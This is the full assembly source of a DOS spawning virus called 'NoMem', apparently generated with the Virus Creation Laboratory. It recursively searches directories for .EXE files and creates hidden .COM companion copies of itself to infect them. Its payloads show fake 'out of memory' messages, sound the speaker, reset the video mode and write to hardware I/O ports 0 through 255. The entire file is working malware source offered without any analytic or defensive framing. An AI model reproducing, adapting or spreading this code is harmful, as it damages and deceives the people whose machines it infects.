; NOMEM.ASM -- NoMem
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Frankenchrist

virus_type      equ     2                       ; Spawning Virus
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

start           label   near

main            proc    near

		mov     ah,04Ah                 ; DOS resize memory function
		mov     bx,(finish - start) / 16 + 0272h  ; BX holds # of para.
		int     021h

		mov     sp,(finish - start) + 01100h  ; Change top of stack

		mov     si,offset spawn_name    ; SI points to true filename
		int     02Eh                    ; DOS execution back-door
		push    ax                      ; Save return value for later

		mov     ax,cs                   ; AX holds code segment
		mov     ds,ax                   ; Restore data segment
		mov     es,ax                   ; Restore extra segment

		mov     cx,0007h                ; Do 7 infections
search_loop:    push    cx                      ; Save CX
		call    search_files            ; Find and infect a file
		pop     cx                      ; Restore CX
		loop    search_loop             ; Repeat until CX is 0

		call    get_second
		cmp     ax,0014h                ; Did the function return 20?
		jg      skip00                  ; If greater, skip effect
		jmp     short strt00            ; Success -- skip jump
skip00:         jmp     end00                   ; Skip the routine
strt00:         mov     si,offset data00        ; SI points to data
		call    display_string
end00:          call    get_second
		cmp     ax,0014h                ; Did the function return 20?
		jl      skip01                  ; If less, skip effect
		cmp     ax,0028h                ; Did the function return 40?
		jg      skip01                  ; If greater, skip effect
		jmp     short strt01            ; Success -- skip jump
skip01:         jmp     end01                   ; Skip the routine
strt01:         mov     si,offset data01        ; SI points to data
		call    display_string
end01:          call    get_second
		cmp     ax,0028h                ; Did the function return 40?
		jl      skip02                  ; If less, skip effect
		jmp     short strt02            ; Success -- skip jump
skip02:         jmp     end02                   ; Skip the routine
strt02:         mov     si,offset data02        ; SI points to data
		call    display_string
end02:          call    infected_all
		or      ax,ax                   ; Did the function return zero?
		jne     skip03                  ; If not equal, skip effect
		jmp     short strt03            ; Success -- skip jump
skip03:         jmp     end03                   ; Skip the routine
strt03:         mov     cx,0005h                ; First argument is 5
new_shot:       push    cx                      ; Save the current count
		mov     dx,0140h                ; DX holds pitch
		mov     bx,0100h                ; BX holds shot duration
		in      al,061h                 ; Read the speaker port
		and     al,11111100b            ; Turn off the speaker bit
fire_shot:      xor     al,2                    ; Toggle the speaker bit
		out     061h,al                 ; Write AL to speaker port
		add     dx,09248h               ;
		mov     cl,3                    ;
		ror     dx,cl                   ; Figure out the delay time
		mov     cx,dx                   ;
		and     cx,01FFh                ;
		or      cx,10                   ;
shoot_pause:    loop    shoot_pause             ; Delay a bit
		dec     bx                      ; Are we done with the shot?
		jnz     fire_shot               ; If not, pulse the speaker
		and     al,11111100b            ; Turn off the speaker bit
		out     061h,al                 ; Write AL to speaker port
		mov     bx,0002h                ; BX holds delay time (ticks)
		xor     ah,ah                   ; Get time function
		int     1Ah                     ; BIOS timer interrupt
		add     bx,dx                   ; Add current time to delay
shoot_delay:    int     1Ah                     ; Get the time again
		cmp     dx,bx                   ; Are we done yet?
		jne     shoot_delay             ; If not, keep checking
		pop     cx                      ; Restore the count
		loop    new_shot                ; Do another shot

		mov     ah,0Fh                  ; BIOS get video mode function
		int     010h
		xor     ah,ah                   ; BIOS set video mode function
		int     010h

end03:          call    infected_all
		or      ax,ax                   ; Did the function return zero?
		jne     skip04                  ; If not equal, skip effect
		call    get_minute
		cmp     ax,000Ch                ; Did the function return 12?
		jl      skip04                  ; If less, skip effect
		jmp     short strt04            ; Success -- skip jump
skip04:         jmp     end04                   ; Skip the routine
strt04:         xor     ah,ah                   ; BIOS get time function
		int     1Ah
		xchg    dx,ax                   ; AX holds low word of timer
		mov     dx,0FFh                 ; Start with port 255
out_loop:       out     dx,al                   ; OUT a value to the port
		dec     dx                      ; Do the next port
		jne     out_loop                ; Repeat until DX = 0

end04:          pop     ax                      ; AL holds return value
		mov     ah,04Ch                 ; DOS terminate function
		int     021h
main            endp

search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		mov     dx,offset root          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		mov     dx,offset all_files     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		mov     dx,offset up_dir        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		mov     dx,offset exe_mask      ; DX points to "*.EXE"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
exe_mask        db      "*.EXE",0               ; Mask for all .EXE files
traverse        endp

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     di,bx                   ; DI points to the DTA

		lea     si,[di + 01Eh]          ; SI points to file name
		mov     dx,si                   ; DX points to file name, too
		mov     di,offset spawn_name + 1; DI points to new name
		xor     ah,ah                   ; AH holds character count
transfer_loop:  lodsb                           ; Load a character
		or      al,al                   ; Is it a NULL?
		je      transfer_end            ; If so then leave the loop
		inc     ah                      ; Add one to the character count
		stosb                           ; Save the byte in the buffer
		jmp     short transfer_loop     ; Repeat the loop
transfer_end:   mov     byte ptr [spawn_name],ah; First byte holds char. count
		mov     byte ptr [di],13        ; Make CR the final character

		mov     di,dx                   ; DI points to file name
		xor     ch,ch                   ;
		mov     cl,ah                   ; CX holds length of filename
		mov     al,'.'                  ; AL holds char. to search for
	repne   scasb                           ; Search for a dot in the name
		mov     word ptr [di],'OC'      ; Store "CO" as first two bytes
		mov     byte ptr [di + 2],'M'   ; Store "M" to make "COM"

		mov     byte ptr [set_carry],0  ; Assume we'll fail
		mov     ax,03D00h               ; DOS open file function, r/o
		int     021h
		jnc     infection_done          ; File already exists, so leave
		mov     byte ptr [set_carry],1  ; Success -- the file is OK

		mov     ah,03Ch                 ; DOS create file function
		mov     cx,00100111b            ; CX holds file attributes (all)
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,finish - start       ; CX holds virus length
		mov     dx,offset start         ; DX points to start of virus
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

infection_done: cmp     byte ptr [set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

spawn_name      db      12,12 dup (?),13        ; Name for next spawn
set_carry       db      ?                       ; Set-carry-on-exit flag
infect_file     endp


display_string  proc    near
		mov     ah,0Eh                  ; BIOS display char. function
display_loop:   lodsb                           ; Load the next char. into AL
		or      al,al                   ; Is the character a null?
		je      disp_strnend            ; If it is, exit
		int     010h                    ; BIOS video interrupt
		jmp     short display_loop      ; Do the next character
disp_strnend:
		ret                             ; Return to caller
display_string  endp

get_minute      proc    near
		mov     ah,02Ch                 ; DOS get time function
		int     021h
		mov     al,cl                   ; Copy minute into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_minute      endp

get_second      proc    near
		mov     ah,02Ch                 ; DOS get time function
		int     021h
		mov     al,dh                   ; Copy second into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_second      endp

infected_all    proc    near
if virus_type   eq      0
		mov     al,byte ptr [di + set_carry]
else
		mov     al,byte ptr [set_carry] ; AX holds success value
endif
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
infected_all    endp

data00          db      "Not enough memory",13,10,0
		

data01          db      "Out of memory",13,10,0
		

data02          db      "Not enough free memory.",13,10,0
		

vcl_marker      db      "[VCL]",0               ; VCL creation marker

finish          label   near

code            ends
		end     main
